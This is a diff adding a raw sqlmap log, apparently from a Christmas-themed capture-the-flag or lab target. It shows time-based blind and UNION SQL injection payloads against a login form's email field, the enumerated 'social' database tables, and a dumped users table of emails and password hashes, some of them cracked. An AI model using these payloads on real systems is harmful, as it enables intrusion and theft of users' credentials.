@@ -1,0 +1,74 @@
+sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
+---
+Parameter: log_email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: log_email=test@gmail.com' AND (SELECT 8452 FROM (SELECT(SLEEP(5)))Aoxg) AND 'hcXl'='hcXl&log_password=test1&login_button=Login
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: log_email=test@gmail.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a766271,0x67536464536e5658715343444878574e636d7168545a736d70784a414559674970556351774d5477,0x71706b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&log_password=test1&login_button=Login
+---
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+current database: 'social'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: log_email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: log_email=test@gmail.com' AND (SELECT 8452 FROM (SELECT(SLEEP(5)))Aoxg) AND 'hcXl'='hcXl&log_password=test1&login_button=Login
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: log_email=test@gmail.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a766271,0x67536464536e5658715343444878574e636d7168545a736d70784a414559674970556351774d5477,0x71706b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&log_password=test1&login_button=Login
+---
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+Database: social
+[8 tables]
++-----------------+
+| comments        |
+| friend_requests |
+| likes           |
+| messages        |
+| notifications   |
+| posts           |
+| trends          |
+| users           |
++-----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: log_email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: log_email=test@gmail.com' AND (SELECT 8452 FROM (SELECT(SLEEP(5)))Aoxg) AND 'hcXl'='hcXl&log_password=test1&login_button=Login
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: log_email=test@gmail.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a766271,0x67536464536e5658715343444878574e636d7168545a736d70784a414559674970556351774d5477,0x71706b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&log_password=test1&login_button=Login
+---
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+Database: social
+Table: users
+[10 entries]
++-----------------------+------------------------+------------------------------------------------+
+| username              | email                  | password                                       |
++-----------------------+------------------------+------------------------------------------------+
+| santa_claus           | bigman@shefesh.com     | f1267830a78c0b59acc06b05694b2e28 (saltnpepper) |
+| mommy_mistletoe       | mmtoe@shefesh.com      | 402223cb4df4c5050a38043d38b1372b               |
+| arnold_schwarzenegger | terminator@shefesh.com | 78a6d0e6c73a29ef6d07d56f32f67b30               |
+| johnfortnite_kennedy  | jayfkay@shefesh.com    | bc808149a93bc7050c3c6c4b7a5a0c97               |
+| john_richardson       | john@keepingit.online  | aa4e356d1509f1c1f53e0191601cde72               |
+| naughty_elf           | notty@shefesh.com      | 6aff5ae0718de8945a3f71ba4d1ca76f               |
+| felix_navidad         | felixnav@shefesh.com   | 57e9eb182943223b0b4e7f17c5e4cb6e               |
+| jessica_claus         | mrsclaus@shefesh.com   | 15bc4f3ba871b2fa651363dcddfb27d9               |
+| myron_larabee         | mailman@shefesh.com    | a60c0662c54bde0301d9aa2ad86203df               |
+| test_test             | test@mail.com          | 5a105e8b9d40e1329780d62ea2265d8a (test1)       |
++-----------------------+------------------------+------------------------------------------------+
+
